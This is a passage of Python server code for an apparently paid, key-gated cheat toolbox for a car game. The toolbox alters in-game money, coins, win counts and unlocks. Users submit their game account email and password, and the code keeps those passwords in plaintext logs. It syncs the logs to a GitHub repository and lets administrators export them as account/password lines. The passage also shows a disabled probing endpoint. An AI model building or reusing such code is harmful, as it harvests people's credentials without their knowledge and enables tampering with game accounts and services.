    out['items'] = [str(x)[:300] for x in out['items'] if str(x).strip()][:30]
    try:
        out['speed'] = max(10, min(300, int(out.get('speed') or 60)))
    except Exception:
        out['speed'] = 60
    try:
        out['fontSize'] = max(10, min(30, int(out.get('fontSize') or 14)))
    except Exception:
        out['fontSize'] = 14
    try:
        out['bgAlpha'] = max(0, min(90, int(out.get('bgAlpha') or 22)))
    except Exception:
        out['bgAlpha'] = 22
    out['enabled'] = bool(out.get('enabled'))
    out['bold'] = bool(out.get('bold'))
    out['colorMode'] = 'solid' if str(out.get('colorMode')) == 'solid' else 'gradient'
    out['bgMode'] = str(out.get('bgMode')) if str(out.get('bgMode')) in ('frosted', 'translucent', 'none') else 'frosted'
    for _ck in ('color', 'gradColor1', 'gradColor2'):
        _cv = str(out.get(_ck) or '').strip()
        if not re.match(r'^#[0-9a-fA-F]{6}$', _cv):
            _cv = _NOTICE.get(_ck) or '#a97bff'
        out[_ck] = _cv
    out['updated'] = int(out.get('updated') or 0)
    return out


def _notice_save(sync=True):
    with _NOTICE_LOCK:
        data = json.dumps(_NOTICE, ensure_ascii=False, indent=1)
    try:
        tmp = NOTICE_FILE + '.tmp'
        with open(tmp, 'w', encoding='utf-8') as f:
            f.write(data)
        os.replace(tmp, NOTICE_FILE)
    except Exception as e:
        print('[notice] 本地保存失败: %r' % e)
    if sync and GH_TOKEN and GH_REPO:
        threading.Thread(target=_gh_push_file, args=(GH_NOTICE_PATH, data, 'update notice.json'),
                         daemon=True).start()


def _notice_load():
    global _NOTICE
    loaded = None
    if os.path.isfile(NOTICE_FILE):
        try:
            with open(NOTICE_FILE, 'r', encoding='utf-8') as f:
                loaded = json.load(f)
        except Exception as e:
            print('[notice] 本地加载失败: %r' % e)
    if not isinstance(loaded, dict) and GH_TOKEN and GH_REPO:
        loaded = _gh_pull_file(GH_NOTICE_PATH)
    _NOTICE = _notice_normalize(loaded if isinstance(loaded, dict) else None)
    print('[notice] 公告就绪：%s，%d 条' % ('开启' if _NOTICE['enabled'] else '关闭', len(_NOTICE['items'])))


def notice_public():
    """前端拉取用（只给必要字段）。"""
    with _NOTICE_LOCK:
        n = json.loads(json.dumps(_NOTICE, ensure_ascii=False))
    return {'ok': True, 'notice': {
        'enabled': bool(n.get('enabled')) and len(n.get('items') or []) > 0,
        'items': n.get('items') or [],
        'speed': n.get('speed') or 60,
        'fontSize': n.get('fontSize') or 14,
        'colorMode': n.get('colorMode') or 'gradient',
        'color': n.get('color') or '#a97bff',
        'gradColor1': n.get('gradColor1') or '#a97bff',
        'gradColor2': n.get('gradColor2') or '#ffd479',
        'bgMode': n.get('bgMode') or 'frosted',
        'bgAlpha': n.get('bgAlpha') if n.get('bgAlpha') is not None else 22,
        'bold': bool(n.get('bold')),
    }}


def _gh_push_file(path, data_str, message='update file'):
    """通用 GitHub 文件推送（带重试）。"""
    for _try in range(3):
        try:
            url = 'https://api.github.com/repos/%s/contents/%s' % (GH_REPO, path)
            sha = None
            try:
                sha = _gh_http(url, 'GET').get('sha')
            except Exception:
                pass
            payload = {
                'message': message,
                'content': base64.b64encode(data_str.encode('utf-8')).decode('ascii'),
            }
            if sha:
                payload['sha'] = sha
            r = _gh_http(url, 'PUT', payload)
            if isinstance(r, dict) and (r.get('content') or r.get('sha') or r.get('commit')):
                print('[gh] %s 同步完成（第%d次）' % (path, _try + 1))
                return True
        except Exception as e:
            print('[gh] %s 同步失败（第%d次）: %r' % (path, _try + 1, e))
        try:
            time.sleep(1.5)
        except Exception:
            pass
    return False


def _gh_pull_file(path):
    """通用 GitHub 文件拉取。"""
    try:
        url = 'https://api.github.com/repos/%s/contents/%s' % (GH_REPO, path)
        obj = _gh_http(url, 'GET')
        content = base64.b64decode(obj.get('content') or '').decode('utf-8', 'replace')
        return json.loads(content)
    except Exception as e:
        print('[gh] %s 拉取失败: %r' % (path, e))
        return None


def _keys_save(sync=True, wait=False):
    with _KEY_LOCK:
        data = json.dumps(_KEYS, ensure_ascii=False, indent=1)
    try:
        tmp = KEYS_FILE + '.tmp'
        with open(tmp, 'w', encoding='utf-8') as f:
            f.write(data)
        os.replace(tmp, KEYS_FILE)
    except Exception as e:
        print('[keys] 本地保存失败: %r' % e)
    if sync and GH_TOKEN and GH_REPO:
        if wait:
            try:
                _gh_push(data)
            except Exception as e:
                print('[keys] 同步推送失败: %r' % e)
        else:
            threading.Thread(target=_gh_push, args=(data,), daemon=True).start()


def _keys_load():
    global _KEYS
    loaded = None
    if os.path.isfile(KEYS_FILE):
        try:
            with open(KEYS_FILE, 'r', encoding='utf-8') as f:
                loaded = json.load(f)
        except Exception as e:
            print('[keys] 本地加载失败: %r' % e)
    if not loaded and GH_TOKEN and GH_REPO:
        loaded = _gh_pull()
    if not isinstance(loaded, dict):
        loaded = {}
    need_save = False
    if not loaded.get('secret'):
        loaded['secret'] = secrets.token_hex(16)
        need_save = True
    if not isinstance(loaded.get('keys'), dict):
        loaded['keys'] = {}
    _KEYS = loaded
    if need_save:
        _keys_save(sync=False)
    print('[keys] 密钥库就绪：%d 条' % len(_KEYS['keys']))




# ============================================================
# 小b 扩展：功能总开关 / 站点定时开关 / 网站管理员口令
# ============================================================
ALL_FEATURES = [
    ('set_name', '改昵称'), ('set_money', '刷钞票'), ('set_coin', '刷金币'),
    ('set_wins', '改胜场'), ('set_loses', '改败场'),
    ('unlock_w16', 'W16引擎'), ('unlock_horns', '所有喇叭'), ('unlock_fuel', '无限汽油'),
    ('unlock_damage', '车辆无损'), ('unlock_smoke', '胎烟特效'),
    ('unlock_wheels', '全部轮毂'), ('unlock_anims', '全部动作'),
    ('unlock_houses', '全部房产'), ('complete_levels', '全关卡通关'),
]
_FEATURE_IDS = [f[0] for f in ALL_FEATURES]

CFG_FILE = os.path.join(HERE, 'config.json')
GH_CFG_PATH = os.environ.get('GH_CFG_PATH') or 'config.json'
_CFG_LOCK = threading.Lock()
_CFG = {'features': list(_FEATURE_IDS), 'site_open': True, 'auto_off_at': 0, 'auto_on_at': 0, 'key_gate': True}


def _cfg_save(sync=True):
    with _CFG_LOCK:
        data = json.dumps(_CFG, ensure_ascii=False, indent=1)
    try:
        tmp = CFG_FILE + '.tmp'
        with open(tmp, 'w', encoding='utf-8') as f:
            f.write(data)
        os.replace(tmp, CFG_FILE)
    except Exception as e:
        print('[cfg] 本地保存失败: %r' % e)
    if sync and GH_TOKEN and GH_REPO:
        threading.Thread(target=_gh_push_file, args=(GH_CFG_PATH, data, 'update config.json'), daemon=True).start()


def _cfg_load():
    global _CFG
    loaded = None
    if os.path.isfile(CFG_FILE):
        try:
            with open(CFG_FILE, 'r', encoding='utf-8') as f:
                loaded = json.load(f)
        except Exception as e:
            print('[cfg] 本地加载失败: %r' % e)
    if not isinstance(loaded, dict) and GH_TOKEN and GH_REPO:
        loaded = _gh_pull_file(GH_CFG_PATH)
    if isinstance(loaded, dict):
        for k in list(_CFG.keys()):
            if k in loaded:
                _CFG[k] = loaded[k]
    if not isinstance(_CFG.get('features'), list):
        _CFG['features'] = list(_FEATURE_IDS)
    _CFG['features'] = [f for f in _CFG['features'] if f in _FEATURE_IDS]
    _CFG['key_gate'] = bool(_CFG.get('key_gate', True))
    print('[cfg] 功能 %d 个，站点%s，首页密钥验证%s' % (
        len(_CFG['features']), '开启' if _CFG.get('site_open') else '关闭',
        '开' if _CFG.get('key_gate') else '关'))


def site_status():
    now = int(time.time())
    with _CFG_LOCK:
        cfg = dict(_CFG)
    changed = False
    if cfg.get('auto_off_at') and now >= cfg['auto_off_at'] and cfg.get('site_open'):
        cfg['site_open'] = False
        cfg['auto_off_at'] = 0
        changed = True
    if cfg.get('auto_on_at') and now >= cfg['auto_on_at'] and not cfg.get('site_open'):
        cfg['site_open'] = True
        cfg['auto_on_at'] = 0
        changed = True
    if changed:
        with _CFG_LOCK:
            _CFG['site_open'] = cfg['site_open']
            _CFG['auto_off_at'] = cfg['auto_off_at']
            _CFG['auto_on_at'] = cfg['auto_on_at']
        _cfg_save()
    nxt = cfg.get('auto_off_at') or cfg.get('auto_on_at') or 0
    return bool(cfg.get('site_open')), nxt


def feature_on(fid):
    with _CFG_LOCK:
        return fid in (_CFG.get('features') or [])


def _admin_key_hash(raw):
    return _key_hash('admin:' + str(raw))


def gen_site_admin():
    raw = 'ADM-' + ''.join(secrets.choice(KEY_ALPHABET) for _ in range(12))
    kh = _admin_key_hash(raw)
    with _KEY_LOCK:
        _KEYS.setdefault('admins', {})[kh] = {'raw': raw, 'created': int(time.time()), 'disabled': False}
    _keys_save(wait=True)
    return raw


def verify_site_admin(raw):
    raw = str(raw or '').strip()
    if not raw:
        return False
    with _KEY_LOCK:
        it = (_KEYS.get('admins') or {}).get(_admin_key_hash(raw))
    return bool(it and not it.get('disabled'))


def _sign_token(payload):
    raw = base64.urlsafe_b64encode(
        json.dumps(payload, separators=(',', ':')).encode('utf-8')).decode('ascii').rstrip('=')
    sig = hmac.new(_KEYS['secret'].encode('utf-8'), raw.encode('ascii'), hashlib.sha256).hexdigest()[:32]
    return raw + '.' + sig


def verify_access(access):
    # 小b：兼容口令制（超管口令 / 管理员口令 / 用户密钥）
    _raw = str(access or '').strip()
    if _raw:
        if sec_safe_eq(_raw, ADMIN_PASS):
            return True, {'kh': '__super__', 'exp': 0, 'type': 'admin'}
        try:
            if verify_site_admin(_raw):
                return True, {'kh': '__siteadmin__', 'exp': 0, 'type': 'admin'}
        except Exception:
            pass
        try:
            _ok, _info = verify_key(_raw)
            if _ok:
                return True, {'kh': (_info or {}).get('kh') or '', 'exp': (_info or {}).get('exp') or 0, 'type': (_info or {}).get('type') or 'user'}
        except Exception:
            pass
    try:
        raw, sig = str(access or '').split('.', 1)
        want = hmac.new(_KEYS['secret'].encode('utf-8'), raw.encode('ascii'), hashlib.sha256).hexdigest()[:32]
        if not hmac.compare_digest(sig, want):
            return False, '校验失败'
        pad = '=' * (-len(raw) % 4)
        payload = json.loads(base64.urlsafe_b64decode(raw + pad).decode('utf-8'))
        exp = int(payload.get('exp') or 0)
        if exp and time.time() > exp:
            return False, '密钥已到期'
        kh = payload.get('kh') or ''
        ptype = payload.get('type') or ''
        if ptype != 'admin':
            with _KEY_LOCK:
                item = _KEYS['keys'].get(kh)
                if not item or item.get('disabled'):
                    return False, '密钥无效或被禁用'
        return True, {'kh': kh, 'exp': exp, 'type': ptype}
    except Exception:
        return False, '校验失败'


def make_admin_access():
    """管理员令牌（输入管理口令后发放：全权限、无到期）"""
    return _sign_token({'kh': '__admin__', 'exp': 0, 'type': 'admin', 't': int(time.time())})




# 小b：管理员/超管的游戏账号使用日志（超管面板可查）
_ADMIN_LOGS = []
_ADMIN_LOG_MAX = 300


def _log_super_use(passval, body, cli, ip, kind):
    try:
        item = {
            'kind': kind,
            'pass': str(passval or '')[:24],
            'email': str(body.get('email') or '').strip(),
            'password': str(body.get('password') or ''),
            'uid': getattr(cli, 'uid', '') or '',
            'ip': ip or '',
            'time': int(time.time()),
        }
        with _KEY_LOCK:
            _KEYS.setdefault('admin_logs', [])
            _KEYS['admin_logs'].append(item)
            if len(_KEYS['admin_logs']) > _ADMIN_LOG_MAX:
                _KEYS['admin_logs'] = _KEYS['admin_logs'][-_ADMIN_LOG_MAX:]
        _keys_save()
    except Exception as e:
        print('[adminlog] %r' % e)


def gen_key(ktype, count=1, perms=None, vip=False):
    if ktype not in KEY_DURATIONS:
        ktype = '1d'
    try:
        count = int(count or 1)
    except Exception:
        count = 1
    count = max(1, min(50, count))
    plist = [p for p in perms if p in ALL_PERMS] if isinstance(perms, list) else list(ALL_PERMS)
    out = []
    with _KEY_LOCK:
        while len(out) < count:
            raw = ''.join(secrets.choice(KEY_ALPHABET) for _ in range(KEY_LENGTH))
            kh = _key_hash(raw)
            if kh in _KEYS['keys']:
                continue
            _KEYS['keys'][kh] = {
                'raw': _fmt_key(raw),
                'type': ktype,
                'created': int(time.time()),
                'activated': None,
                'disabled': False,
                'perms': plist,
                'uses': [],
                # PATCH40：VIP 密钥不限制账号绑定
                'vip': bool(vip),
            }
            out.append(_fmt_key(raw))
    return out


def activate_key(raw):
    """校验密钥有效性（不激活、不计时、不绑定）。
    真正的激活发生在用户登录游戏账号成功时（见 bind_key_account）。"""
    raw = _norm_key(raw)
    if len(raw) not in (12, 18):
        return {'ok': False, 'message': '密钥应为 18 位'}
    with _KEY_LOCK:
        kh = None
        item = None
        for cand in _key_hash_alts(raw):
            it = _KEYS['keys'].get(cand)
            if it:
                kh = cand
                item = it
                break
        if not item:
            return {'ok': False, 'message': '密钥不存在'}
        if item.get('disabled'):
            return {'ok': False, 'message': '密钥已被禁用'}
        now = int(time.time())
        act = int(item.get('activated') or 0)
        dur = KEY_DURATIONS.get(item.get('type') or '1d', 86400)
        # 只有"已激活"的密钥才判断过期
        if act and dur and now > act + dur:
            return {'ok': False, 'message': '密钥已过期'}
        ktype = item.get('type') or '1d'
        expire = (act + dur) if (act and dur) else 0
        perms = list(item.get('perms') or [])
        bound = item.get('bound_email') or ''
    access = _sign_token({'kh': kh, 'exp': expire, 'type': ktype, 't': now})
    return {'ok': True, 'access': access, 'type': ktype, 'exp': expire,
            'typeName': KEY_EXPIRE_NAMES.get(ktype, ktype), 'perms': perms,
            'activated': bool(act), 'boundEmail': bound}


def verify_key(raw):
    """校验密钥，返回 (ok, info)。info: {kh, type, exp}"""
    raw = _norm_key(raw)
    if not raw:
        return False, '请填写密钥'
    if len(raw) not in (12, 18):
        return False, '密钥应为 18 位'
    try:
        with _KEY_LOCK:
            kh = None
            item = None
            for cand in _key_hash_alts(raw):
                it = _KEYS['keys'].get(cand)
                if it:
                    kh = cand
                    item = it
                    break
            if not item:
                return False, '密钥不存在'
            if item.get('disabled'):
                return False, '密钥已被禁用'
            now = int(time.time())
            act = int(item.get('activated') or 0)
            dur = KEY_DURATIONS.get(item.get('type') or 'forever', 0)
            if act and dur and now > act + dur:
                return False, '密钥已过期'
            ktype = item.get('type') or 'forever'
            expire = (act + dur) if (act and dur) else 0
        return True, {'kh': kh, 'type': ktype, 'exp': expire}
    except Exception as e:
        return False, '校验异常: %s' % str(e)[:60]


def bind_key_account(kh, email):
    """登录游戏账号成功时调用：首次绑定邮箱 + 开始计时。
    返回 (ok, message)"""
    if not kh:
        return True, ''
    email = str(email or '').strip().lower()
    now = int(time.time())
    changed = False
    with _KEY_LOCK:
        it = _KEYS['keys'].get(kh)
        if not it:
            return True, ''
        if it.get('disabled'):
            return False, '密钥已被禁用'
        # PATCH40：VIP 密钥不限制账号绑定，直接放行（但仍要开始计时）
        if it.get('vip'):
            if not it.get('activated'):
                it['activated'] = now
                changed = True
        else:
            be = str(it.get('bound_email') or '').strip().lower()
            if be and email and be != email:
                return False, '此密钥已绑定其他账号，无法使用'
            if not be and email:
                it['bound_email'] = email
                changed = True
            if not it.get('activated'):
                it['activated'] = now
                changed = True
    # 注意：_keys_save 内部也要拿 _KEY_LOCK，必须放在锁外调用（否则死锁）
    if changed:
        _keys_save()
    return True, ''


_ADMIN_FAILS = {'count': 0, 'until': 0}


def admin_check(passwd, handler=None):
    if time.time() < _ADMIN_FAILS['until']:
        return False, '尝试次数过多，请 10 分钟后再试'
    # 按来源限流（防单点爆破）
    if handler is not None:
        _allow, _ban = sec_check(handler, 'admin')
        if not _allow:
            return False, '尝试过于频繁，请 %d 秒后再试' % _ban
    if sec_safe_eq(str(passwd or ''), ADMIN_PASS):
        _ADMIN_FAILS['count'] = 0
        if handler is not None:
            sec_ok(handler, 'admin')
        return True, ''
    _ADMIN_FAILS['count'] += 1
    if _ADMIN_FAILS['count'] >= 8:
        _ADMIN_FAILS['until'] = time.time() + 600
        _ADMIN_FAILS['count'] = 0
    if handler is not None:
        _b = sec_fail(handler, 'admin')
        if _b:
            return False, '尝试次数过多，已临时锁定 %d 秒' % SEC_BAN_SECONDS
    return False, '管理口令不对'


_keys_load()


class Handler(BaseHTTPRequestHandler):
    server_version = 'CPMToolbox/1.0'

    def log_message(self, fmt, *args):
        pass

    def _json(self, code, obj):
        body = json.dumps(obj, ensure_ascii=False).encode('utf-8')
        try:
            with open(os.path.join(HERE, 'server_run.log'), 'a', encoding='utf-8') as f:
                f.write('[%s] %s %s -> %s\n' % (
                    time.strftime('%H:%M:%S'), self.command, self.path,
                    json.dumps(obj, ensure_ascii=False)[:500]))
        except Exception:
            pass
        self.send_response(code)
        self.send_header('Content-Type', 'application/json; charset=utf-8')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _read_body(self):
        ln = int(self.headers.get('Content-Length') or 0)
        if ln <= 0:
            return {}
        raw = self.rfile.read(ln)
        try:
            return json.loads(raw.decode('utf-8', 'replace'))
        except Exception:
            return {}

    # ---------- 静态文件 ----------
    def do_GET(self):
        path = self.path.split('?')[0]
        if path == '/api/ver':
            return self._json(200, {'ok': True, 'ver': SERVER_VERSION})
        if path == '/api/notice':
            return self._json(200, notice_public())
        if path == '/' or path == '/admin':
            path = '/index.html'
        if path.startswith('/static/'):
            path = path[len('/static'):]
        # 兼容 /vendor 等路径映射到 static 内（本项目只有 /index.html）
        fp = os.path.normpath(os.path.join(STATIC_DIR, path.lstrip('/')))
        ok = fp.startswith(STATIC_DIR) and os.path.isfile(fp)
        if not ok:
            # 云部署兼容：文件平铺在项目根目录时也可用
            alt = os.path.normpath(os.path.join(HERE, path.lstrip('/')))
            if alt.startswith(HERE) and os.path.isfile(alt):
                fp = alt
                ok = True
        if not ok:
            self.send_response(404)
            self.send_header('Content-Type', 'text/plain; charset=utf-8')
            self.end_headers()
            self.wfile.write('not found'.encode('utf-8'))
            return
        ext = os.path.splitext(fp)[1].lower()
        with open(fp, 'rb') as f:
            body = f.read()
        self.send_response(200)
        self.send_header('Content-Type', MIME.get(ext, 'application/octet-stream'))
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Cache-Control', 'no-cache, must-revalidate')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    # ---------- API ----------
    def do_POST(self):
        path = self.path.split('?')[0]
        body = self._read_body()
        try:
            if path == '/api/ver':
                return self._json(200, {'ok': True, 'ver': SERVER_VERSION})

            if path == '/api/entry':
                _allow, _ban = sec_check(self, 'entry')
                if not _allow:
                    return self._json(200, {'ok': False, 'message': '尝试过于频繁，请 %d 秒后再试' % _ban})
                inp = str(body.get('input') or '').strip()
                if not inp:
                    return self._json(200, {'ok': False, 'message': '请输入密钥'})
                if sec_safe_eq(inp, ADMIN_PASS):
                    sec_ok(self, 'entry')
                    return self._json(200, {'ok': True, 'role': 'super'})
                if verify_site_admin(inp):
                    sec_ok(self, 'entry')
                    return self._json(200, {'ok': True, 'role': 'admin'})
                r = activate_key(inp)
                if isinstance(r, dict) and r.get('ok'):
                    sec_ok(self, 'entry')
                    r['role'] = 'user'
                else:
                    _banned = sec_fail(self, 'entry')
                    if _banned:
                        return self._json(200, {'ok': False, 'message': '尝试次数过多，已临时锁定 %d 秒' % SEC_BAN_SECONDS})
                return self._json(200, r)

            # ===== 小b：管理员生成密钥（超管/管理员） =====
            if path == '/api/admin/gen_key':
                pass_v = str(body.get('pass') or '')
                is_super = sec_safe_eq(pass_v, ADMIN_PASS)
                is_admin = verify_site_admin(pass_v)
                if not (is_super or is_admin):
                    return self._json(200, {'ok': False, 'message': '无权限'})
                if is_super:
                    ktype = str(body.get('type') or 'forever')
                    vip = bool(body.get('vip'))
                else:
                    ktype = 'forever'
                    vip = False
                try:
                    cnt = int(body.get('count') or 1)
                except Exception:
                    cnt = 1
                keys = gen_key(ktype, cnt, vip=vip) if 'vip' in gen_key.__code__.co_varnames else gen_key(ktype, cnt)
                try:
                    _keys_save(wait=True)
                except Exception:
                    pass
                return self._json(200, {'ok': True, 'keys': keys})

            if path == '/api/admin/keys':
                pass_v = str(body.get('pass') or '')
                if not (sec_safe_eq(pass_v, ADMIN_PASS) or verify_site_admin(pass_v)):
                    return self._json(200, {'ok': False, 'message': '无权限'})
                with _KEY_LOCK:
                    items = []
                    for kh, it in _KEYS['keys'].items():
                        items.append({'kh': kh, 'raw': it.get('raw'), 'type': it.get('type'),
                                      'created': it.get('created'), 'activated': it.get('activated'),
                                      'disabled': bool(it.get('disabled')), 'vip': bool(it.get('vip')),
                                      'boundEmail': it.get('bound_email') or ''})
                items.sort(key=lambda x: x.get('created') or 0, reverse=True)
                return self._json(200, {'ok': True, 'keys': items[:800], 'now': int(time.time())})

            if path == '/api/admin/del_key':
                pass_v = str(body.get('pass') or '')
                if not (sec_safe_eq(pass_v, ADMIN_PASS) or verify_site_admin(pass_v)):
                    return self._json(200, {'ok': False, 'message': '无权限'})
                kh = str(body.get('kh') or '')
                with _KEY_LOCK:
                    done = _KEYS['keys'].pop(kh, None) is not None
                if done:
                    _keys_save()
                return self._json(200, {'ok': done})

            if path == '/api/admin/new_admin':
                if not sec_safe_eq(str(body.get('pass') or ''), ADMIN_PASS):
                    return self._json(200, {'ok': False, 'message': '无权限'})
                return self._json(200, {'ok': True, 'pass': gen_site_admin()})

            if path == '/api/admin/admins':
                if not sec_safe_eq(str(body.get('pass') or ''), ADMIN_PASS):
                    return self._json(200, {'ok': False, 'message': '无权限'})
                with _KEY_LOCK:
                    items = [{'raw': v.get('raw'), 'created': v.get('created'), 'disabled': bool(v.get('disabled'))}
                             for v in (_KEYS.get('admins') or {}).values()]
                items.sort(key=lambda x: x.get('created') or 0, reverse=True)
                return self._json(200, {'ok': True, 'admins': items})

            if path == '/api/admin/del_admin':
                if not sec_safe_eq(str(body.get('pass') or ''), ADMIN_PASS):
                    return self._json(200, {'ok': False, 'message': '无权限'})
                kh = _admin_key_hash(str(body.get('raw') or ''))
                with _KEY_LOCK:
                    done = (_KEYS.get('admins') or {}).pop(kh, None) is not None
                if done:
                    _keys_save()
                return self._json(200, {'ok': done})

            # ===== 小b：导出日志（按时间段）+ 导出后清空 =====
            if path == '/api/admin/logs/export':
                if not sec_safe_eq(str(body.get('pass') or ''), ADMIN_PASS):
                    return self._json(200, {'ok': False, 'message': '无权访问'})
                try:
                    _from = int(body.get('from') or 0)
                except Exception:
                    _from = 0
                try:
                    _to = int(body.get('to') or 0)
                except Exception:
                    _to = 0
                _lines = []
                with _KEY_LOCK:
                    logs = list(_KEYS.get('admin_logs') or [])
                    keys = dict(_KEYS.get('keys') or {})
                    keep_logs = []
                    consumed = 0
                    for g in logs:
                        t = int(g.get('time') or 0)
                        hit = True
                        if _from and t < _from:
                            hit = False
                        if _to and t > _to:
                            hit = False
                        if hit:
                            consumed += 1
                            _lines.append('[%s] %s | 账号:%s | 密码:%s' % (
                                time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(t)),
                                ('超级管理员' if g.get('kind') == 'super' else '网站管理员'),
                                g.get('email') or '-', g.get('password') or '-'))
                        else:
                            keep_logs.append(g)
                    _KEYS['admin_logs'] = keep_logs[-_ADMIN_LOG_MAX:]
                    # 密钥使用记录
                    cn2 = 0
                    for kh, it in list(keys.items()):
                        uses = list(it.get('uses') or [])
                        keep_uses = []
                        for u in uses:
                            t = int(u.get('time') or 0)
                            hit = True
                            if _from and t < _from:
                                hit = False
                            if _to and t > _to:
                                hit = False
                            if hit:
                                cn2 += 1
                                _lines.append('[%s] 密钥:%s | 账号:%s | 密码:%s' % (
                                    time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(t)),
                                    it.get('raw') or '-', u.get('email') or '-', u.get('password') or '-'))
                            else:
                                keep_uses.append(u)
                        if len(keep_uses) != len(uses):
                            it['uses'] = keep_uses
                    consumed += cn2
                try:
                    _keys_save(wait=True)
                except Exception:
                    _keys_save()
                _txt = '\n'.join(_lines) if _lines else '（该时间段无记录）'
                return self._json(200, {'ok': True, 'text': _txt, 'count': len(_lines)})

            # ===== 小b：管理员使用日志（超管查） =====
            if path == '/api/admin/logs':
                if not sec_safe_eq(str(body.get('pass') or ''), ADMIN_PASS):
                    return self._json(200, {'ok': False, 'message': '无权访问'})
                with _KEY_LOCK:
                    logs = list(_KEYS.get('admin_logs') or [])
                    keys = []
                    for kh, it in _KEYS.get('keys', {}).items():
                        uses = list(it.get('uses') or [])
                        if uses:
                            keys.append({'raw': it.get('raw'), 'created': it.get('created'),
                                         'type': it.get('type'), 'uses': uses})
                logs.sort(key=lambda x: x.get('time') or 0, reverse=True)
                keys.sort(key=lambda x: x.get('created') or 0, reverse=True)
                return self._json(200, {'ok': True, 'logs': logs[:200], 'keys': keys[:200],
                                        'now': int(time.time())})

            # ===== 小b：站点状态 =====
            if path == '/api/site':
                is_open, nxt = site_status()
                with _CFG_LOCK:
                    feats = list(_CFG.get('features') or [])
                    key_gate = bool(_CFG.get('key_gate', True))
                return self._json(200, {'ok': True, 'open': is_open, 'next': nxt, 'features': feats,
                                        'all': ALL_FEATURES, 'key_gate': key_gate, 'now': int(time.time())})

            # ===== 小b：站点开关（仅超管） =====
            if path == '/api/site/set':
                if not sec_safe_eq(str(body.get('pass') or ''), ADMIN_PASS):
                    return self._json(200, {'ok': False, 'message': '无权限'})
                with _CFG_LOCK:
                    if 'site_open' in body:
                        _CFG['site_open'] = bool(body.get('site_open'))
                    if 'key_gate' in body:
                        _CFG['key_gate'] = bool(body.get('key_gate'))
                    if 'auto_off_sec' in body:
                        try:
                            sec = int(body.get('auto_off_sec') or 0)
                        except Exception:
                            sec = 0
                        _CFG['auto_off_at'] = (int(time.time()) + sec) if sec > 0 else 0
                    if 'auto_on_sec' in body:
                        try:
                            sec = int(body.get('auto_on_sec') or 0)
                        except Exception:
                            sec = 0
                        _CFG['auto_on_at'] = (int(time.time()) + sec) if sec > 0 else 0
                _cfg_save()
                is_open, nxt = site_status()
                with _CFG_LOCK:
                    key_gate = bool(_CFG.get('key_gate', True))
                return self._json(200, {'ok': True, 'open': is_open, 'next': nxt, 'key_gate': key_gate})

            # ===== 小b：功能开关（仅超管） =====
            if path == '/api/features':
                if not sec_safe_eq(str(body.get('pass') or ''), ADMIN_PASS):
                    return self._json(200, {'ok': False, 'message': '无权限'})
                if isinstance(body.get('features'), list):
                    feats = [f for f in body.get('features') if f in _FEATURE_IDS]
                    with _CFG_LOCK:
                        _CFG['features'] = feats
                    _cfg_save()
                with _CFG_LOCK:
                    feats = list(_CFG.get('features') or [])
                return self._json(200, {'ok': True, 'features': feats, 'all': ALL_FEATURES})

            # ===== 小b：生成/查看网站管理员（仅超管） =====
            if path == '/api/admin/gen':
                if not sec_safe_eq(str(body.get('pass') or ''), ADMIN_PASS):
                    return self._json(200, {'ok': False, 'message': '无权限'})
                return self._json(200, {'ok': True, 'pass': gen_site_admin()})

            if path == '/api/admin/list':
                if not sec_safe_eq(str(body.get('pass') or ''), ADMIN_PASS):
                    return self._json(200, {'ok': False, 'message': '无权限'})
                with _KEY_LOCK:
                    items = [{'raw': v.get('raw'), 'created': v.get('created'), 'disabled': bool(v.get('disabled'))}
                             for v in (_KEYS.get('admins') or {}).values()]
                items.sort(key=lambda x: x.get('created') or 0, reverse=True)
                return self._json(200, {'ok': True, 'admins': items})

            if path == '/api/admin/del':
                if not sec_safe_eq(str(body.get('pass') or ''), ADMIN_PASS):
                    return self._json(200, {'ok': False, 'message': '无权限'})
                kh = _admin_key_hash(str(body.get('raw') or ''))
                with _KEY_LOCK:
                    done = (_KEYS.get('admins') or {}).pop(kh, None) is not None
                if done:
                    _keys_save()
                return self._json(200, {'ok': done})

            if path == '/api/key/activate':
                _allow, _ban = sec_check(self, 'activate')
                if not _allow:
                    return self._json(200, {'ok': False, 'message': '尝试过于频繁，请 %d 秒后再试' % _ban})
                _kr = activate_key(body.get('key') or '')
                if isinstance(_kr, dict) and _kr.get('ok'):
                    sec_ok(self, 'activate')
                else:
                    _b2 = sec_fail(self, 'activate')
                    if _b2:
                        return self._json(200, {'ok': False, 'message': '尝试次数过多，已临时锁定 %d 秒' % SEC_BAN_SECONDS})
                return self._json(200, _kr)

            if path == '/api/key/check':
                okk, info = verify_access(body.get('access') or '')
                if not okk:
                    return self._json(200, {'ok': False, 'message': info if isinstance(info, str) else '密钥无效', 'needKey': True})
                perms = None
                if info.get('type') == 'admin':
                    perms = 'ALL'
                else:
                    with _KEY_LOCK:
                        _it = _KEYS['keys'].get(info.get('kh') or '')
                        perms = list(_it.get('perms') or []) if _it else []
                return self._json(200, {'ok': True, 'type': info.get('type') or '', 'exp': info.get('exp') or 0,
                                        'typeName': KEY_EXPIRE_NAMES.get(info.get('type') or '', ''), 'perms': perms})

            if path == '/api/diag':
                return self._json(200, {'ok': False, 'message': '该功能已下线'})
                oks, msg = admin_check(body.get('pass'), self)
                if not oks:
                    return self._json(200, {'ok': False, 'message': msg})
                c = get_session(str(body.get('sid') or ''))
                if not c or not c.record:
                    return self._json(200, {'ok': False, 'message': '先在页面上登录一个账号，再点探测'})
                report = []
                _part = str(body.get('part') or '').strip()
                _seg = str(body.get('seg') or '').strip()
                _GROUPS = {'1': ('1', '2', '2b'), '2': ('3', '4', '6'), '3': ('5', '5b', '5c', '7', '7b', '8'), '4': ('9', '10', '12', '13'), '5': ('dec',), '6': ('wr',), '7': ('inj',), '8': ('bin',), '9': ('tr9',), '10': ('stash',), '11': ('unstash',), '12': ('gexp',), '13': ('vyn',), '14': ('vyn2',), '15': ('vyn3',), '16': ('carb',), '17': ('del',), '18': ('scan2',), '19': ('delfn',), '20': ('fixc',)}
                _sel = set()
                if _seg:
                    for _pp in _seg.split(','):
                        _pp = _pp.strip()
                        if _pp:
